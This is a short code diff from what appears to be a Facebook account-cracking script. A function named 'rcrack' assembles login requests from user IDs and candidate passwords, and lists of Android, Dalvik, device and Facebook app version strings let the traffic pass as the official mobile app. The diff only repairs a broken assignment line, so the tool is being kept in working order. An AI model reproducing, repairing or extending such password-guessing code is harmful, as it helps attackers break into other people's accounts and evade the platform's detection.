@@ -1160,7 +1160,7 @@ def rcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-header = 'dalvik_version = ["Dalvik/2.1.0"]
+dalvik_version = ["Dalvik/2.1.0"]
 android_version = ["Android 10", "Android 11", "Android 12"]
 device_make = ["Samsung", "Nokia", "Google Pixel", "OnePlus"]
 app_version = ["FBAV/409.0.0.27.106", "FBAV/410.0.0.28.107", "FBAV/411.0.0.29.108"]
